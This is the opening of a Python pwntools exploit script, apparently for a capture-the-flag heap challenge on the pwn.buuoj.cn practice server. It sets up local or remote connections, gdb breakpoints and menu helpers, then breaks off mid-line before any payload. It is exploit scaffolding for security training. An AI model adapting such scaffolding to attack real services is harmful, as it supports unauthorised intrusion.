import sys, threading
threading.Thread(target=lambda: sys.stdout.write('\x1b[1;32m')).start()
import time
from pwn import *

context.binary = "./pwn"
context.log_level = "debug"

if args["REMOTE"]:
  p = remote("pwn.buuoj.cn", 20001)
else:
  p = process("./pwn")

elf = ELF("./pwn")
libc = ELF("./libc.so")

def dbg():
  script = '''
    b *0x08048A2E
    b *0x08048B6F
    b *0x08048B93
    c
  '''
  gdb.attach(p, script)

def menu(idx):
  p.recvuntil("Your choice:")
  p.sendline(str(idx))

def add(size, data):
  menu(1)
  p.recvuntil("Size:")
  p.sendline(str(size))
  p.recvuntil
